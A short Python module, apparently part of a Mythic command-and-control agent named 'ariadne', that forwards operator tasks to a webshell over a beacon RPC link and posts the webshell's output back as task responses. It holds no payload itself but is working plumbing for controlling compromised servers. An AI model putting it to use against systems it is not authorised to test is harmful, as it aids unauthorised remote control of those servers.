import logging
from typing import Tuple

from mythic_container.MythicGoRPC.send_mythic_rpc_response_create import (
    SendMythicRPCResponseCreate,
    MythicRPCResponseCreateMessage,
)

from ..beacon import beacon_manager

logger = logging.getLogger("ariadne.dispatch")


async def dispatch_to_webshell(
    callback_uuid: str, task_id: int, action: str, *args: str
) -> Tuple[bool, str]:
    rpc = beacon_manager.get_rpc(callback_uuid)
    if rpc is None:
        return False, "No active beacon for this callback"

    success, _, result = await rpc.send_command(action, str(task_id), *args)
    return success, result


async def dispatch_and_respond(
    callback_uuid: str, task_id: int, action: str, *args: str
) -> Tuple[bool, str]:
    success, result = await dispatch_to_webshell(callback_uuid, task_id, action, *args)

    try:
        await SendMythicRPCResponseCreate(
            MythicRPCResponseCreateMessage(
                TaskID=task_id,
                Response=result.encode("utf-8"),
            )
        )
    except Exception as e:
        logger.error(f"Failed to post response for task {task_id}: {e}")

    return success, result
